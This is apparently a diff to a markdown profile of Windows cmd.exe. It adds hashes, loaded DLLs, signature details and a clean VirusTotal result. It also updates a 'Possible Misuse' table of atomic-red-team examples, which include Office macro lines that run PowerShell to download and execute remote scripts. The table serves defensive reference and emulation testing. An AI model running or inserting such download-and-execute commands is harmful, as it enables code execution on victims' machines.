@@ -18,6 +18,9 @@ SHA256 | `3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2`
 SHA384 | `B2E8BB5140B7C76AD97CDE056F5CF3594E08630252431B366E11A5FAC77C6623C095821B474169B67EE9E69F5ACC79E1`
 SHA512 | `F08B7131BB3F5BB941C0445FC01B592AECFF6ADCB58E1803643073C44CF49BA11A5309B0DCF93C9CD91D60D2753DAFFA86CE4A882C74EB5C912CA0ADCCEB257D`
 SSDEEP | `6144:xRekiTbWl/hVKhSuEAIKUa86F7iENfeLHl6OUtdSJm:u3TbA/hVCrIKUaNF7iEN2LHwP+J`
+IMP | `272245E2988E1E430500B852C4FB5E18`
+PESHA1 | `B647000BC9250724925FB8ECCB839DFAB152E631`
+PE256 | `5E630BE0CDC281C008F85A1772423DB21E5B8FFCF10337521589EFA0B4ADE6E2`
 
 ## Runtime Data
 
@@ -214,7 +217,10 @@ conhost.exe
 Path | Type
 -- | --
 (R-D)   C:\Windows\System32\en-US\cmd.exe.mui | File
-(RW-)   C:\Users\Administrator\Documents | File
+(RW-)   C:\Users\user | File
+\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000004.db | Section
+\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000004.db | Section
+\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*cversions.2.ro | Section
 \BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
 \BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section
 
@@ -223,14 +229,23 @@ Path | Type
 
 Path |
 -- |
+C:\Windows\System32\bcryptPrimitives.dll |
+C:\Windows\system32\cmd.exe |
+C:\Windows\System32\combase.dll |
+C:\Windows\System32\KERNEL32.DLL |
+C:\Windows\System32\KERNELBASE.dll |
+C:\Windows\System32\msvcrt.dll |
 C:\Windows\SYSTEM32\ntdll.dll |
+C:\Windows\System32\RPCRT4.dll |
+C:\Windows\System32\ucrtbase.dll |
+C:\Windows\SYSTEM32\winbrand.dll |
 
 
 ## Signature
 
 * Status: Signature verified.
-* Serial: `330000026551AE1BBD005CBFBD000000000265`
-* Thumbprint: `E168609353F30FF2373157B4EB8CD519D07A2BFF`
+* Serial: `3300000266BD1580EFA75CD6D3000000000266`
+* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
 * Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
 * Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
 
@@ -243,7 +258,12 @@ C:\Windows\SYSTEM32\ntdll.dll |
 * Product Version: 10.0.17763.1
 * Language: English (United States)
 * Legal Copyright:  Microsoft Corporation. All rights reserved.
+* Machine Type: 64-bit
 
+## File Scan
+
+* VirusTotal Detections: 0/71
+* VirusTotal Link: https://www.virustotal.com/gui/file/3656f37a1c6951ec4496fabb8ee957d3a6e3c276d5a3785476b482c9c0d32ea2/detection/
 
 
 ## Possible Misuse
@@ -339,7 +359,7 @@ Source | Source File | Example | License
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | objProcess.Create("cmd.exe", null, objConfig, intProcessID); | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.bat"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
-[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
+[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: File and Directory Discovery (cmd.exe) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: File and Directory Discovery (cmd.exe) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
 [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1007.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md) | Upon successful execution, cmd.exe will execute service commands with expected result to stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
